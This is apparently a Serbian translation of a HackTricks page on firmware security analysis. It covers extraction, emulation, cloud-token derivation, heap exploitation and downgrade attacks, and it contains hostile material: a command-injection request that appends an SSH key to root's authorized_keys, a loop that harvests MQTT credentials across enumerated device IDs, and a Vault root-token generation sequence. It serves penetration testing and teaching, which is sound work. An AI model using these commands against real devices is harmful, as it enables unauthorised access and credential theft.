# Analiza firmware-a

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je ključni softver koji uređajima omogućava pravilan rad upravljanjem komunikacijom između hardverskih komponenti i softvera sa kojim korisnici stupaju u interakciju, kao i njenim omogućavanjem. Čuva se u trajnoj memoriji, čime se uređaju obezbeđuje pristup ključnim instrukcijama od trenutka uključivanja, što dovodi do pokretanja operativnog sistema. Analiza i potencijalna izmena firmware-a predstavljaju ključan korak u identifikovanju bezbednosnih ranjivosti.

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- Detaljima bootloader-a
- Hardverskom rasporedu i datasheet-ovima
- Metrikama codebase-a i lokacijama izvornog koda
- Eksternim bibliotekama i tipovima licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i identifikovanim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su od neprocenjive vrednosti, kao i analiza svih dostupnih komponenti open-source softvera kroz manuelne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Nabavljanje firmware-a**

Firmware se može nabaviti na različite načine, od kojih svaki podrazumeva drugačiji nivo složenosti:

- **Direktno** od izvora (developera, proizvođača)
- **Izgradnjom** na osnovu dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih sajtova za podršku
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Direktnim pristupom **cloud storage-u**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja putem konekcija kao što su **UART**, **JTAG** ili **PICit**
- **Sniffing-om** zahteva za ažuriranje unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardcoded endpoint-a za ažuriranje**
- **Dump-ovanjem** iz bootloader-a ili mreže
- **Uklanjanjem i čitanjem** memorijskog čipa kada sve ostalo ne uspe, uz korišćenje odgovarajućih hardverskih alata

### UART-only logovi: forsiranje root shell-a putem U-Boot env-a u flash-u

Ako se UART RX ignoriše (postoje samo logovi), i dalje možete forsirati init shell tako što ćete **offline izmeniti U-Boot environment blob**:

1. Napravite dump SPI flash-a pomoću SOIC-8 klipse i programatora (3.3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locirajte U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh`, a zatim **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na embedded uređajima kod kojih je bootloader shell onemogućen, ali je env particija upisiva putem eksternog pristupa flash-u.

## Analiza firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izvučete informacije kako biste znali kako da ga tretirate. Za to možete koristiti različite alate:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** image-a pomoću `binwalk -E <bin>`. Ako je entropija niska, image verovatno nije enkriptovan. Ako je entropija visoka, verovatno je enkriptovan (ili kompresovan na neki način).

Pored toga, možete koristiti ove alate za ekstrakciju **datoteka ugrađenih u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled datoteke.

### Dobavljanje filesystem-a

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo je da budete u mogućnosti da **ekstrahujete filesystem**.\
Binwalk ga obično ekstrahuje unutar **foldera imenovanog prema tipu filesystem-a**, što je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručna ekstrakcija filesystem-a

Ponekad binwalk **neće imati magic byte filesystem-a u svojim potpisima**. U tim slučajevima, koristite binwalk da **pronađete offset filesystem-a i izdvojite kompresovani filesystem** iz binarnog fajla, a zatim **ručno ekstrahujte** filesystem u skladu sa njegovim tipom, koristeći korake navedene u nastavku.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd command** za izdvajanje Squashfs filesystem-a.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će se nakon toga nalaziti u direktorijumu "`squashfs-root`".

- CPIO archive datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 file systems

`$ jefferson rootfsfile.jffs2`

- Za ubifs file systems sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware-a

Kada se firmware preuzme, neophodno je analizirati ga radi razumevanja njegove strukture i potencijalnih ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware image-a.

### Alati za početnu analizu

Dat je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u identifikovanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i file systems:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenio status enkripcije image-a, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za izdvajanje **ugrađenih datoteka**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje fajl sistema

Pomoću `binwalk -ev <bin>` obično se može izdvojiti fajl sistem, često u direktorijum čiji naziv odgovara tipu fajl sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip fajl sistema zbog nedostajućih magic bytes, neophodno je ručno izdvajanje. To podrazumeva korišćenje alata `binwalk` za pronalaženje offset-a fajl sistema, nakon čega se pomoću komande `dd` fajl sistem izdvaja:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga se, u zavisnosti od tipa fajl sistema (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza fajl sistema

Kada je fajl sistem izdvojen, počinje potraga za bezbednosnim propustima. Pažnja se posvećuje nebezbednim mrežnim daemonima, hardkodovanim kredencijalima, API endpointima, funkcionalnostima update servera, nekompajliranom kodu, startup skriptama i kompajliranim binarnim fajlovima za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL sertifikate i ključeve u direktorijumu **etc/ssl**
- Konfiguracione i skript fajlove zbog potencijalnih ranjivosti
- Ugrađene binarne fajlove za dalju analizu
- Uobičajene web servere i binarne fajlove IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar fajl sistema:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih fajlova

Ivorni kod i kompajlirani binarni fajlovi pronađeni u fajl sistemu moraju se pažljivo ispitati zbog ranjivosti. Alati kao što su **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne fajlove pomažu u identifikovanju nezaštićenih binarnih fajlova koji bi mogli biti iskorišćeni.

## Preuzimanje cloud konfiguracije i MQTT kredencijala putem izvedenih URL tokena

Mnogi IoT hub-ovi preuzimaju konfiguraciju za pojedinačni uređaj sa cloud endpointa koji izgleda ovako:

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-ja uređaja koristeći hardkodovanu tajnu, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen kao heksadecimalna vrednost velikim slovima

Ovaj dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, često otkrivajući MQTT kredencijale u plaintextu i prefikse topic-a.

Praktičan tok rada:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju obrazac URL-a cloud konfiguracije i adresu brokera, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Povratite STATIC_KEY i algoritam tokena iz firmware-a

- Učitajte binarne datoteke u Ghidra/radare2 i pretražite putanju do konfiguracije ("/pf/") ili korišćenje MD5-a.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i pretvorite digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupite cloud config i MQTT credentials

- Sastavite URL i preuzmite JSON pomoću curl; parsirajte ga pomoću jq da biste izdvojili secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotreba plaintext MQTT-a i slabih ACL-ova za topic-e (ako postoje)

- Koristite pronađene credentials da se subscribe-ujete na maintenance topic-e i potražite osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerišite predvidljive ID-jeve uređaja (u velikom obimu, uz autorizaciju)

- Mnogi ekosistemi ugrađuju bajtove dobavljačkog OUI-ja/proizvoda/tipa, nakon kojih sledi sekvencijalni sufiks.
- Možete programatski iterirati kroz kandidate za ID-jeve, izvoditi tokene i preuzimati konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavite izričito odobrenje pre pokušaja mass enumeration.
- Kada je moguće, prednost dajte emulaciji ili static analysis-u radi otkrivanja secrets bez menjanja ciljnog hardvera.


Proces emulacije firmware-a omogućava **dynamic analysis** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove povezane sa zavisnostima od hardvera ili architecture, ali prebacivanje root filesystem-a ili određenih binaries na uređaj sa odgovarajućom architecture i endianness, kao što je Raspberry Pi, ili na unapred pripremljenu virtual machine, može omogućiti dalja testiranja.

### Emulacija pojedinačnih binaries

Za ispitivanje pojedinačnih programa ključno je utvrditi njihov endianness i CPU architecture.

#### Primer sa MIPS Architecture

Za emulaciju binary-ja za MIPS architecture može se koristiti komanda:
```bash
file ./squashfs-root/bin/busybox
```
I za instalaciju neophodnih alata za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke sa little-endian formatom koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke proces je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući proces i pomažući pri dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi stvarno ili emulirano okruženje uređaja. Neophodno je zadržati shell pristup OS-u i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, zbog čega će povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati sistem datoteka, iskorišćavanje izloženih web-stranica i mrežnih servisa, kao i istraživanje ranjivosti bootloader-a. Testovi integriteta firmware-a su ključni za identifikovanje potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoint-a i identifikovanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za embedded ciljeve bez potpunog debugger-a, **kopirajte statički povezani `gdbserver`** na uređaj i povežite se sa njim udaljeno:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapiranje Zigbee / radio-co-processor poruka

Na IoT hubovima RF stack je često podeljen između **radio MCU-a** i Linux userland procesa. Koristan workflow je mapirati putanju:

1. **RF frame** u vazduhu
2. **parser na strani kontrolera** na radio MCU-u
3. **tekstualni serial/UART ili TLV protokol** prosleđen Linuxu (na primer `/dev/tty*`)
4. **application dispatcher** u glavnom daemonu
5. **handler specifičan za protokol / state machine**

Ova arhitektura stvara dva reversing cilja umesto jednog. Ako kontroler konvertuje binarne radio frame-ove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, pronađite:

- **message groups** i dispatch tabele
- Koje poruke mogu doći sa **network-a**, a koje potiču od samog kontrolera
- Tačna **manufacturer-specific discriminator** polja (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji handleri su dostupni samo tokom faza **commissioning-a**, discovery-ja ili download-a firmware-a/modela

Za Zigbee, snimite pairing saobraćaj i proverite da li se cilj i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, sniffing commissioning saobraćaja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, zato zabeležite da li ih testirani uređaj zaista primenjuje.

### Manufacturer-specific protocol handleri i FSM-gated dostupnost

Vendor-specific Zigbee/ZCL komande često su bolji cilj od standardizovanih clustera, jer prosleđuju podatke **custom parsing kodu** i internim **FSM-ovima** sa manje proverenom validacijom.

Praktični workflow:

- Reverse-ujte command dispatcher dok ne pronađete **vendor-only handler**.
- Rekonstruišite tabele za **FSM state**, **event**, **check**, **action** i **next-state**.
- Identifikujte **transitional states** koji se automatski pomeraju napred i retry/error grane koje na kraju resetuju ili oslobađaju state kojim upravlja attacker.
- Potvrdite koje su legitimne razmene protokola potrebne da bi se daemon postavio u ranjivo stanje, umesto da pretpostavite da je buggy handler uvek dostupan.

Kod protokola osetljivih na timing, replay paketa iz Python framework-a može biti prespor. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardware-u (na primer **nRF52840**) pomoću stack-a vendor-grade kvaliteta, kako biste mogli da izložite ispravne **endpoints**, **attributes** i commissioning timing.

### Klasa bugova sa fragmented-download u embedded daemonima

Ponavljajuća klasa firmware bugova javlja se u **fragmented blob/model/configuration download-ima**:

1. **Prvi fragment** (`offset == 0`) čuva `ctx->total_size` i alocira `malloc(total_size)`.
2. Kasniji fragmenti proveravaju samo attacker-controlled **packet-local** polja, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **originalnu alociranu veličinu**.

Ovo omogućava attackeru da pošalje:

- Prvi validni fragment sa **malom** deklarisanom ukupnom veličinom, kako bi iznudio malu heap alokaciju.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Falsifikovanu packet-local veličinu koja zadovoljava sveže provere, dok i dalje dovodi do overflow-a prvobitno alociranog buffer-a.

Kada se ranjiva putanja nalazi iza commissioning logike, exploitation mora uključiti dovoljno **device emulation-a** da se cilj uvede u očekivano stanje za model-download ili blob-download pre slanja neispravnih fragmenata.

### Protocol-driven `free()` triggers

U embedded daemonima, najlakši način za pokretanje heap metadata exploitation-a često nije „čekanje cleanup-a“, već **iznuđivanje sopstvenog error handling-a protokola**:

- Pošaljite neispravne follow-up fragmente kako biste FSM gurnuli u **retry** ili **error** stanja.
- Premašite retry prag, tako da daemon **resetuje context** i oslobodi oštećeni buffer.
- Iskoristite ovaj predvidivi `free()` za pokretanje allocator-side primitives pre nego što se proces sruši iz nepovezanih razloga.

Ovo je posebno korisno protiv **musl/uClibc/dlmalloc-like** allocator-a u embedded Linuxu, gde korupcija chunk metadata može pretvoriti unlink/unbin logiku u write primitive. Stabilan obrazac je korupcija **size field-a** radi preusmeravanja allocator traversal-a ka **fake chunks** pripremljenim unutar overflow-ovanog buffer-a, umesto trenutnog prepisivanja stvarnih bin pointer-a i rušenja procesa.

## Binary Exploitation and Proof-of-Concept

Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje arhitekture cilja i programiranje u lower-level jezicima. Binary runtime protections u embedded sistemima su retke, ali kada postoje, tehnike kao što je Return Oriented Programming (ROP) mogu biti neophodne.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbins slične glibc-u. Kasnija velika alokacija može pokrenuti `__malloc_consolidate()`, zato svaki fake chunk mora proći provere (razumna veličina, `fd = 0` i okolni chunk-ovi koji se smatraju „u upotrebi“).
- **Non-PIE binaries under ASLR:** ako je ASLR omogućen, ali je glavni binary **non-PIE**, adrese unutar binary-ja, u `.data/.bss`, ostaju stabilne. Možete ciljati region koji već liči na validan heap chunk header, kako biste fastbin alokaciju usmerili na **function pointer table**.
- **Parser-stopping NUL:** kada se JSON parsira, `\x00` u payload-u može zaustaviti parsing, uz zadržavanje pratećih attacker-controlled bajtova za stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može postaviti executable shellcode u poznato mapiranje i skočiti na njega.

## Prepared Operating Systems for Firmware Analysis

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prekonfigurisana okruženja za firmware security testing, opremljena neophodnim alatima.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen sprovođenju security assessment-a i penetration testing-a Internet of Things (IoT) uređaja. Štedi mnogo vremena tako što pruža prekonfigurisano okruženje sa učitanim svim neophodnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za embedded security testing zasnovan na Ubuntu 18.04, sa unapred učitanim alatima za firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Čak i kada vendor implementira cryptographic signature provere za firmware image-ove, **version rollback (downgrade) protection često izostaje**. Kada boot- ili recovery-loader samo proverava potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *version* (ili monotonic counter) image-a koji se flash-uje, attacker može legitimno instalirati **stariji, ranjivi firmware koji i dalje ima validan potpis** i time ponovo uvesti patched ranjivosti.

Tipičan attack workflow:

1. **Nabavite stariji potpisani image**
* Preuzmite ga sa vendor-ovog javnog download portala, CDN-a ili support sajta.
* Izvucite ga iz pratećih mobile/desktop aplikacija (npr. unutar Android APK-a u `assets/firmware/`).
* Preuzmite ga iz third-party repository-ja kao što su VirusTotal, Internet arhive, forumi itd.
2. **Upload-ujte ili servirajte image uređaju** preko bilo kog izloženog update channel-a:
* Web UI, mobile-app API, USB, TFTP, MQTT itd.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih na server-side-u i pokreću recovery/upgrade.
3. Nakon downgrade-a, exploit-ujte ranjivost koja je patched u novijem release-u (na primer command-injection filter koji je kasnije dodat).
4. Opciono ponovo flash-ujte najnoviji image ili onemogućite updates kako biste izbegli detekciju nakon sticanja persistence-a.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgraded) firmware-u, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde – omogućavanje root pristupa zasnovanog na SSH ključevima). Kasnije verzije firmware-a uvele su osnovni filter karaktera, ali odsustvo zaštite od downgrade-a čini tu ispravku beskorisnom.

### Izdvajanje Firmware-a Iz Mobilnih Aplikacija

Mnogi proizvođači uključuju kompletne firmware image-e u prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX-u, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih image-a bez pristupa fizičkom hardveru.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Updater-only anti-rollback bypass u A/B slot dizajnima

Neki vendori zaista implementiraju anti-downgrade **ratchet**, ali samo unutar *updater* logike (na primer, UDS rutina preko CAN-a, recovery komanda ili userspace OTA agent). Ako **bootloader** kasnije proverava samo potpis/CRC image-a i veruje partition table-u ili slot metadata-i, rollback protection se i dalje može zaobići.

Tipičan slab dizajn:

- Firmware metadata sadrži i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater upoređuje ratchet image-a sa vrednošću sačuvanom u persistent storage-u i odbija starije potpisane image-e.
- Bootloader **ne parsira** taj ratchet i samo proverava header, CRC i potpis pre bootovanja izabranog slot-a.
- Aktivacija slot-a čuva se odvojeno u partition table-u ili generation counter-u po slotu i nije kriptografski vezana za tačan firmware digest koji je validiran.

Ovo stvara primitivu **validate-one-image / boot-another-image** u dual-slot sistemima. Ako napadač može da natera updater da označi slot B kao sledeći boot target koristeći trenutno potpisan image i kasnije prepiše slot B pre reboot-a, bootloader i dalje može da bootuje downgraded image jer veruje samo već commit-ovanoj slot metadata-i.

Uobičajen obrazac zloupotrebe:

1. Upload-ujte **current signed** firmware u pasivni slot i pokrenite uobičajenu validation/switch rutinu, tako da layout označi taj slot kao sledeći aktivni.
2. **Još nemojte reboot-ovati**. Ponovo uđite u slot-preparation/erase rutinu u istoj sesiji.
3. Zloupotrebite zastareli boot-state ili zastarelu slot-selection logiku tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upišite **older but still signed** firmware u taj slot.
5. Preskočite validation rutinu koja primenjuje ratchet i direktno reboot-ujte.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i bootuje stari image.

Stvari koje treba tražiti prilikom reverse engineering-a A/B update implementacija:

- Izbor slot-a izveden iz **boot-time flag-ova** koji se ne osvežavaju nakon uspešnog switch-a.
- Rutina nalik `prepare_passive_slot()` koja briše slot na osnovu zastarelog state-a umesto **trenutnog commit-ovanog layout-a**.
- Funkcija nalik `part_write_layout()` koja samo uvećava **generation counter** / active flag i ne čuva hash validiranog image-a.
- Ratchet provere implementirane u userspace-u ili updater kodu, ali **ne** u ROM / bootloader / secure boot fazama.
- Erase ili recovery rutine koje ostavljaju slot označenim kao bootable čak i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Checklist za procenu update logike

* Da li su transport/authentication *update endpoint-a* adekvatno zaštićeni (TLS + authentication)?
* Da li uređaj upoređuje **brojeve verzija** ili **monotoni anti-rollback counter** pre flashing-a?
* Da li se image verifikuje unutar secure boot chain-a (npr. potpise proverava ROM kod)?
* Da li **bootloader primenjuje isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li je activation metadata slot-a **vezana za validirani firmware digest/version**, ili se slot može izmeniti nakon promocije?
* Nakon uspešnog switch-a slot-a, da li je uređaj primoran da reboot-uje ili su kasnije update/erase rutine i dalje dostupne u istoj sesiji?
* Da li userland kod obavlja dodatne sanity provere (npr. dozvoljeni partition map, broj modela)?
* Da li *partial* ili *backup* update flow-ovi ponovo koriste istu validation logiku?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Vulnerable firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, koristite sledeće vulnerable firmware projekte kao početnu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dekripciju firmware-a iz embedded KMS/Vault state-a

Kada update image kombinuje male plaintext metadata podatke sa velikim blob-om visoke entropije, prvo uradite container triage pre bilo kakvog brute-force pokušaja:

- Izbacite headere, offset-e i granice linija pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: sledećih 8 bajtova su salt, a preostali bajtovi su ciphertext.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je signal da gledate RSA-2048 ciphertext koji obavija random firmware password/session key.
- Detached PGP materijal u istom fajlu često štiti samo autentičnost; nemojte pretpostaviti da je on mehanizam za confidentiality.

Ako statička pretraga ključeva (`grep`, `strings`, PEM/PGP searches) ne uspe, reverse-ujte **operativni decrypt path** umesto da samo tražite private keys:

- Decompile-ujte updater / management binary i pratite ko čita encrypted blob, koji helper/API ga unwrap-uje i koje logical key name traži.
- Pretražite extracted root filesystem za KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit fajlove i init scripts.
- Tretirajte plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ili lokalne KMS auto-unseal scripts kao ekvivalent private-key materijala.

Ako appliance isporučuje originalni Vault binary i storage backend, replay-ovanje tog environment-a obično je jednostavnije od ponovne implementacije Vault internals-a:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Sa root pristupom na kloniranom KMS-u:

- Transit ključeve učinite exportable samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
